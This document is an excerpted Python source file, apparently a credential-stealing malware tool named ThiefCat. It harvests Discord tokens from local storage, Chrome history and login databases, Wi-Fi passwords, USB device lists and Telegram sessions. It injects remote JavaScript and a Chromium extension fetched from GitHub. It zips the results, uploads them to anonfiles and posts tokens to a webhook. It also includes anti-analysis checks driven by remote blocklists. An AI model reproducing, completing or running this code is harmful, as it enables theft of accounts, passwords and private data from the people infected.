...
json_confg = {
    ...
    "url_hawkinject": "https://raw.githubusercontent.com/FalseKSCH/Cat-MyInject/main/index.js",
...
url = f"https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/nope.json"
...
class th1efc4t_first_funct(Functions):
    def __init__(self):
    ...
    def ping_on_running(self: str) -> str:
        ...
        try:
            ping1 = {
                "username": f"{th1efc4t} ",
                "avatar_url": f"https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png",
                "content": "@everyone",
            }
            ping2 = {
                "username": f"{th1efc4t} ",
    ...
    def install_extension(self):
        ...
        try:
            ...
            extensions = {
                'extensions': f'https://github.com/FalseKSCH/Chromium-Injection/raw/main/extensions.zip'
            }
        ...
        try:
            ...
            with open(config, "r", errors="ignore") as f:
                try:
                    ...
                    return
            item[f"{th1efc4t}_is_here"] = f"https://github.com/FalseKSCH"
            ...
            with open(config, "w") as f:
                ...
                f.write(f"\n\n//{th1efc4t}_is_here | https://github.com/FalseKSCH")
        except:
            pass
        ...
        try:
            ...
            if os.path.exists(bd):
                ...
                with open(bd, "r", encoding="cp437", errors="ignore") as f:
                    txt = f.read()
                    content = txt.replace(x, f"{th1efc4t}_goat")
    ...
    def thiefcat_GetToken(self):
        ...
        newpaths_to_check = set()

        roaming_path = os.path.expanduser('~\\AppData\\Roaming')
        roaming_subfolders = next(os.walk(roaming_path))[1][:4]
        local_path = os.path.expanduser('~\\AppData\\Local')
        local_subfolders = next(os.walk(local_path))[1][:4] 

        for subfolder in roaming_subfolders:
            subfolder_path = os.path.join(roaming_path, subfolder)
            for root, dirs, files in os.walk(subfolder_path):
                for file in files:
                    if file.endswith('.ldb'):
                        for path in paths_to_check.values():
                            if path not in newpaths_to_check:
                                newpaths_to_check.add(root)
                        break
        ...
        for path in paths_to_check.values():
            newpaths_to_check.add(path)

        newpaths_to_check = list(newpaths_to_check)
                        ...
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexcrypt, line):
                                ...
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.th1efc4tid:
                                        self.hawked.append(token)
                                        self.th1efc4tid.append(uid)

        for path in newpaths_to_check:
            if not os.path.exists(path):
                continue
    ...
    def thiefcat_GetGoogle3(self):
        ...
        try:
            with open(os.path.join(self.dir, "Google", "History.txt"), "w", encoding="cp437", errors="ignore") as f:
                def th1efc4tpleaseexctract(db_cursor):
                ...
                for prof in os.listdir(self.chrome_user_path):
                    ...
                    with sqlite3.connect(login) as conn:
                        ...
                        web_history = th1efc4tpleaseexctract(cursor)
                        f.write(f"{' ' * 17}{th1efc4t} SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}")
    ...
    def thiefcat_GetAllUSB(self):
        ...
        try:
            ...
            os.makedirs(directory, exist_ok=True)
            output = Functions.th1efc4tfindDevices()
            if output:
    ...
    def thiefcat_GetWifi(self):
        ...
        try:
            directory = os.path.join(self.dir, "Systeme")
            os.makedirs(directory, exist_ok=True)
            passwords = Functions.th1efc4tfindwifi()
            profiles = [
                f'SSID: {ssid}\n{th1efc4t}  PASSW:{password}' for ssid, password in passwords.items()]
            divider = f'\n\n{th1efc4t} | https://github.com/FalseKSCH/{th1efc4t}\n\n'
    ...
    def StealTelegramSessions(self):
        if self.Found_Telegram == "yes":
            ...
            if not telegram_paths:
                telegram_paths.append(os.path.join(roaming, "Telegram Desktop"))
            ...
            if has_key_datas and len(login_paths) > 1:
    ...
    async def upload_and_return(self, file_name, path):
        try:
            with open(path, mode="rb") as file:
                files = {"file": (file_name, file)}
                response = requests.post("https://api.anonfiles.com/upload", files=files)
    ...
    def finished_bc(self):
        try:
                    ...
                    with open(path, "r", errors="ignore") as ff:
                        ...
                        if not x:
                            ...
                            with open(path, "w", encoding="utf-8", errors="ignore") as f:
                                f.write(
                                    f"{th1efc4t} Create By FalseKSCH | https://github.com/FalseKSCH\n\n"
                                )
                            with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                                fp.write(
                                    x
                                    + f"\n\n{th1efc4t} Create By FalseKSCH Team | https://github.com/FalseKSCH"
                                )
            _zipfile = os.path.join(
                self.appdata, f"{self.getlange(self.pc_codewinl)}THIEFCAT_[{imthebestdev}].zip")
            ...
            zipped_file.close()
            try:
                self.upload_on_anonfiles(f"{self.getlange(self.pc_codewinl)}THIEFCAT_{imthebestdev}.zip", _zipfile)
                time.sleep(1)
            except:
                pass
            finally:
            ...
            for i, tkn in enumerate(self.hawked):
                if i >= 3:
                    break
                tokens += f"{tkn}\n\n"
            fileCount = f"{file_count} {th1efc4t} FILES: "
                ...
                "embeds": [
                    {
                        "author": {
                            "name": f"{th1efc4t} v8 ",
                            "url": f"https://github.com/{th1efc4t}",
                            "icon_url": f"https://raw.githubusercontent.com/FalseKSCH/assets/main/d95it6h-ceaa1da3-727a-402f-8061-9a0a8e68af13.gif",
                        },
                        "color": 4873727,
                        "description": f"[{th1efc4t} ON TOP <a:thiefcat:1125732578419290122>]({self.googlemap})",
                        "fields": [
                            {
                                "name": "\u200b",
                                "value": f"""```ansi
    ...
    {tokens[:2000] if tokens else "tokens not found"}```
        """.replace(" ", ""),
                        ...
                        "footer": {
                            "text": f"{th1efc4t} Create BY FalseKSCH・https://github.com/FalseKSCH"
                        },
                    }
                ],
            }
...
class AntiDebugg(Functions):
    ...
    def __init__(self):
        ...
        blocked_prog = "https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blocked_progr.json"
        blocked_pcname = "https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blockedpcname.json"
        blocked_hwid = "https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blocked_hwid.json"
        blocked_ips = "https://raw.githubusercontent.com/FalseKSCH/testingsomedead/main/blocked_ips.json"
...
if __name__ == "__main__" and os.name == "nt":
    asyncio.run(th1efc4t_first_funct().init())
